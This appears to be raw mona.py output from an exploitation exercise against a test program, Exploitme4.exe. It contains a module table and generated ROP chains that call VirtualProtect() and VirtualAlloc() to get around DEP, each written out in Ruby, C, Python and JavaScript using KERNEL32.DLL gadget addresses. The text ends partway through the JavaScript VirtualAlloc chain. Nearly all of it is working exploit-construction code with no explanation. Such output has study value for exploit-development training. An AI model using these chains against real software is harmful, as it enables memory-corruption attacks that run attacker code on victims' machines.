----------------------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------
 0x767d0000 | 0x76a0a000 | 0x0023a000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 0x4140
 0x770e0000 | 0x77200000 | 0x00120000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ucrtbase.dll] (C:\Windows\System32\ucrtbase.dll) 0x4140
 0x00280000 | 0x00286000 | 0x00006000 | True   | True    | True  | False |  False   | False  | -1.0- [Exploitme4.exe] (D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme4\Release\Exploitme4.exe) 0x8140
 0x75c00000 | 0x75cf0000 | 0x000f0000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL) 0x4140
 0x6fc70000 | 0x6fc85000 | 0x00015000 | True   | True    | True  | True  |  False   | True   | 14.36.32532.0 [VCRUNTIME140.dll] (C:\Windows\SYSTEM32\VCRUNTIME140.dll) 0x4140
 0x77450000 | 0x775f4000 | 0x001a4000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c1ea52,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c651e7,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  # put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b382,  # XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebx:---]
      0x75c49091,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c22ee7,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  #  
      0x75c47392,  # INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  # ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  # XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75c5296b,  # POP ECX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75cb0edf,  # &Writable location [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x75c6943a,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c35383,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c4770d,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36250,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x75c1ea52,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x75c651e7,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  // put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  // ADD EAX,C95EC033 // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b382,  // XCHG EAX,EBP // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebx:---]
      0x75c49091,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x75c49be8,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c22ee7,  // POP EBX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  //  
      0x75c47392,  // INC EBX // ADD AL,5B // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  // ADD EBX,EAX // XOR EAX,EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x75c463f3,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75c49be8,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  // XCHG EAX,EDX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x75c5296b,  // POP ECX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75cb0edf,  // &Writable location [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x75c6943a,  // POP EDI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c35383,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x75c4770d,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x75c36250,  // PUSHAD // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c1ea52,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c81390,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c651e7,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  # put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b382,  # XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebx:---]
      0x75c49091,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c22ee7,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  #  
      0x75c47392,  # INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  # ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  # XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75c5296b,  # POP ECX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75cb0edf,  # &Writable location [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x75c6943a,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c35383,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c4770d,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36250,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uea52%u75c1" + // 0x75c1ea52 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u1390%u75c8" + // 0x75c81390 : ,# ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u7708%u75c4" + // 0x75c47708 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ud43c%u75c6" + // 0x75c6d43c : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u51e7%u75c6" + // 0x75c651e7 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u3fcd%u36a1" + // 0x36a13fcd : ,# put delta into eax (-> put 0x00000000 into ebp)
    "%u1168%u75c2" + // 0x75c21168 : ,# ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ub382%u75c2" + // 0x75c2b382 : ,# XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u9091%u75c4" + // 0x75c49091 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u9be8%u75c4" + // 0x75c49be8 : ,# NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u2ee7%u75c2" + // 0x75c22ee7 : ,# POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,#
    "%u7392%u75c4" + // 0x75c47392 : ,# INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffa0%u75c1" + // 0x75c1ffa0 : ,# ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u63f3%u75c4" + // 0x75c463f3 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u9be8%u75c4" + // 0x75c49be8 : ,# NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u563a%u75c6" + // 0x75c6563a : ,# XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u296b%u75c5" + // 0x75c5296b : ,# POP ECX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u0edf%u75cb" + // 0x75cb0edf : ,# &Writable location [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u943a%u75c6" + // 0x75c6943a : ,# POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u5383%u75c3" + // 0x75c35383 : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u770d%u75c4" + // 0x75c4770d : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u6250%u75c3" + // 0x75c36250 : ,# PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c8137c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  # put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b4da,  # XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x75c487ba,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1e9af,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  #  
      0x75c47392,  # INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  # ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x75c49095,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a14fcd,  # put delta into eax (-> put 0x00001000 into edx)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  # XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c3ad7a,  # XCHG EAX,ECX # ADD AL,BYTE PTR DS:[EAX] # POP EBP # RETN 0x04 [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x75c6bafc,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x75c35383,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c651e7,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36095,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x75c463f3,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c8137c,  // ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x75c463f3,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  // put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  // ADD EAX,C95EC033 // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b4da,  // XCHG EAX,EBP // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebx:---]
      0x75c463f3,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x75c487ba,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1e9af,  // POP EBX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  //  
      0x75c47392,  // INC EBX // ADD AL,5B // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  // ADD EBX,EAX // XOR EAX,EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x75c49095,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a14fcd,  // put delta into eax (-> put 0x00001000 into edx)
      0x75c21168,  // ADD EAX,C95EC033 // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  // XCHG EAX,EDX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x75c463f3,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75c49be8,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c3ad7a,  // XCHG EAX,ECX // ADD AL,BYTE PTR DS:[EAX] // POP EBP // RETN 0x04 [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_edi:---]
      0x75c6bafc,  // POP EDI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x75c35383,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x75c651e7,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x75c36095,  // PUSHAD // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c8137c,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x75c47708,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6d43c,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a13fcd,  # put delta into eax (-> put 0x00000000 into ebp)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c2b4da,  # XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x75c487ba,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1e9af,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffff,  #  
      0x75c47392,  # INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c1ffa0,  # ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x75c49095,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x36a14fcd,  # put delta into eax (-> put 0x00001000 into edx)
      0x75c21168,  # ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c6563a,  # XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75c463f3,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c49be8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75c3ad7a,  # XCHG EAX,ECX # ADD AL,BYTE PTR DS:[EAX] # POP EBP # RETN 0x04 [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_edi:---]
      0x75c6bafc,  # POP EDI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x75c35383,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75c651e7,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c36095,  # PUSHAD # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u63f3%u75c4" + // 0x75c463f3 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u137c%u75c8" + // 0x75c8137c : ,# ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u7708%u75c4" + // 0x75c47708 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ud43c%u75c6" + // 0x75c6d43c : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u63f3%u75c4" + // 0x75c463f3 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u3fcd%u36a1" + // 0x36a13fcd : ,# put delta into eax (-> put 0x00000000 into ebp)
    "%u1168%u75c2" + // 0x75c21168 : ,# ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ub4da%u75c2" + // 0x75c2b4da : ,# XCHG EAX,EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u63f3%u75c4" + // 0x75c463f3 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u87ba%u75c4" + // 0x75c487ba : ,# NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%ue9af%u75c1" + // 0x75c1e9af : ,# POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,#
    "%u7392%u75c4" + // 0x75c47392 : ,# INC EBX # ADD AL,5B # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffa0%u75c1" + // 0x75c1ffa0 : ,# ADD EBX,EAX # XOR EAX,EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u9095%u75c4" + // 0x75c49095 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u4fcd%u36a1" + // 0x36a14fcd : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u1168%u75c2" + // 0x75c21168 : ,# ADD EAX,C95EC033 # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u563a%u75c6" + // 0x75c6563a : ,# XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u63f3%u75c4" + // 0x75c463f3 : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u9be8%u75c4" + // 0x75c49be8 : ,# NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
